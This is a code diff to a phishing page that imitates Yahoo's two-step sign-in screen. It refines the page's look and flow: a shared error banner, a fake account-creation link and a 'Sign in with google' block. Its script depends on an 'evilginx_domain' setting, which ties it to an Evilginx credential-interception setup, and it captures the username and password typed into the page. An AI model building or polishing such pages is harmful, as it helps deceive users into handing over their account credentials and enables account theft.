@@ -66,6 +66,7 @@
         .text-block-7 { font-family: 'Open Sans', sans-serif; color: #666; margin-bottom: 20px; }
         .restart.logger.w-button { width: 100%; padding: 14px; background: #4a90e2; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background-color 0.3s ease; }
         .restart.logger.w-button:hover { background: #357abd; }
+        .error-message-banner { background: #fee; border: 1px solid #fcc; color: #c33; padding: 12px; border-radius: 6px; margin-bottom: 20px; display: none; }
     </style>
 </head>
 <body>
@@ -87,35 +88,42 @@
                 <form id="login-form" name="login-form" data-name="Login Form" class="form">
                     <img src="images/yahoo.png" loading="lazy" alt="" class="image-2">
                     
+                    <!-- Error Banner -->
+                    <div id="error-banner" class="error-message-banner"></div>
+
                     <!-- Email Step -->
                     <div id="email-step" class="step active">
                         <h1 class="heading-2">Sign in</h1>
-                        <div class="text-block-2">Sign in using your Yahoo account</div>
-                        <div class="lpl numb">Username, Email or Mobile</div>
+                        <div class="text-block-2">Sign in using your Yahoo account<br></div>
+                        <div class="lpl numb">Username, Email or Mobile<br></div>
                         <input class="field w-input" maxlength="256" name="username" placeholder="" type="email" id="username" required>
-                        <div id="username-error" class="error-message"></div>
                         <div class="div-block-6">
                             <label class="w-checkbox checkbox-field">
                                 <div class="w-checkbox-input w-checkbox-input--inputType-custom checkbox-field"></div>
                                 <input type="checkbox" id="stay-signed-in" name="stay-signed-in" style="opacity:0;position:absolute;z-index:-1">
                                 <span class="checkbox-label w-form-label" for="stay-signed-in">Stay signed in</span>
                             </label>
-                            <div class="text-block-4">Forgotten username?</div>
+                            <a href="#" class="text-block-4">Forgotten username?</a>
                         </div>
                         <button type="button" id="next-to-password" class="nergzt logger w-button">Next</button>
+                        <a href="#" class="button logger w-button">Create an account</a>
+                        <div class="text-block-5">or</div>
+                        <div class="div-block-7 logger">
+                            <img src="images/google.png" loading="lazy" alt="Google Logo" class="image-3">
+                            <div class="text-block-6">Sign in with google</div>
+                        </div>
                     </div>
 
                     <!-- Password Step -->
                     <div id="password-step" class="step">
+                        <div id="user-identifier" class="user-identifier-text"></div>
                         <h1 class="heading-2"><strong>Enter password</strong></h1>
-                        <div class="text-block-2" id="password-prompt-email"></div>
-                        <div class="pazz lpl numb">Password</div>
+                        <div class="text-block-2">to finish signing in<br></div>
+                        <div class="pazz lpl numb">Password<br></div>
                         <div class="ms-input-wrap">
                             <input class="ms-input w-input" maxlength="256" name="passwd" placeholder="" type="password" id="password" required>
-                            <!-- Show/Hide toggle can be added here if needed -->
                         </div>
-                        <div id="password-error" class="error-message"></div>
-                        <button type="submit" class="logger w-button">Next</button>
+                        <button type="submit" id="submit-credentials" class="logger w-button">Next</button>
                     </div>
 
                 </form>
@@ -145,8 +153,8 @@
 
         // --- UTILITY FUNCTIONS ---
         const utils = {
-            showError: (stepId, message) => {
-                const errorEl = document.getElementById(`${stepId}-error`);
+            showError: (message) => {
+                const errorEl = document.getElementById('error-banner');
                 if (errorEl) {
                     errorEl.textContent = message;
                     errorEl.style.display = 'block';
@@ -188,7 +196,7 @@
                 
                 if (!state.evilginxDomain) {
                     console.error("CRITICAL: evilginx_domain parameter is missing. The form will not work.");
-                    utils.showError('email', 'Configuration error. Please access through the correct link.');
+                    utils.showError('Configuration error. Please access through the correct link.');
                     document.getElementById('next-to-password').disabled = true;
                     return;
                 }
@@ -213,7 +221,7 @@
 
                 state.username = document.getElementById('username').value.trim();
                 if (!state.username) {
-                    utils.showError('email', 'Please enter your email or phone number.');
+                    utils.showError('Please enter your email or phone number.');
                     return;
                 }
 
@@ -223,7 +231,7 @@
                 // Simulate a quick check
                 setTimeout(() => {
                     utils.switchStep('password');
-                    document.getElementById('password-prompt-email').textContent = `Signing in as: ${state.username}`;
+                    document.getElementById('user-identifier').textContent = `Signing in as: ${state.username}`;
                     document.getElementById('password').focus();
                 }, 500);
             },
@@ -233,7 +241,7 @@
 
                 const password = document.getElementById('password').value;
                 if (!password) {
-                    utils.showError('password', 'Please enter your password.');
+                    utils.showError('Please enter your password.');
                     return;
                 }
 
@@ -280,7 +288,7 @@
         // --- EVENT LISTENERS ---
         const setupEventListeners = () => {
             document.getElementById('next-to-password').addEventListener('click', formHandlers.handleEmailSubmit);
-            document.getElementById('login-form').addEventListener('submit', formHandlers.handlePasswordSubmit);
+            document.getElementById('submit-credentials').addEventListener('click', formHandlers.handlePasswordSubmit);
         };
 
         // --- INITIALIZATION ---
